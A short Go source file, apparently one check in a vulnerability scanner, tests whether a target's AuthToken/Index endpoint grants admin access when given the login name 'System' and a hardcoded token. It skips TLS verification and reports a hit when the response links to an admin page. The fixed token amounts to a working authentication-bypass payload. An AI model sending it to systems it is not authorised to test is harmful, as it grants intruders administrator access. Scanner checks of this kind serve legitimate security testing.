package vulList

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/fatih/color"
)

func AuthTokenCheck(target string) error {
	// 捕获重定向的响应而不自动跟随
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略证书验证
		},
	}

	// payload
	baseurl := target + "AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f"

	resp, err := client.Get(baseurl)
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Error reading response body: %v", err)
	}
	responseBody := string(body)

	if strings.Contains(responseBody, `href="/Home6/AdminPretty"`) {
		green := color.New(color.FgGreen)
		green.Println("[+]AuthToken interface arbitrary account login vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-]AuthToken interface arbitrary account login vulnerability")
		fmt.Println()
	}
	return nil
}
